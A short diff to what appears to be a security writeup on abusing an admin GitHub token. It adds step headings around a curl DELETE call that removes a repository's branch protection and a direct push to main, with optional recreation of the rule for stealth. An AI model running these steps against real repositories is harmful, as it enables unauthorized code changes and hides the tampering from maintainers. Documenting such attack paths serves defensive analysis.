@@ -140,6 +140,8 @@ If the token has admin rights on the repo, the attacker can perform the followin
     2. Push code directly to protected branch
     3. Optionally recreate the rule (for stealth)
 
+### Step 1 — Delete the branch protection rule
+
 ```bash
 curl -X DELETE \
   -H "Authorization: token $TOKEN" \
@@ -147,7 +149,7 @@ curl -X DELETE \
   https://api.github.com/repos/<ORG>/<REPO>/branches/main/protection
 ```
 
-Then push:
+### Step 2 —  Push code directly to protected branch
 
 ```bash
 git push origin main
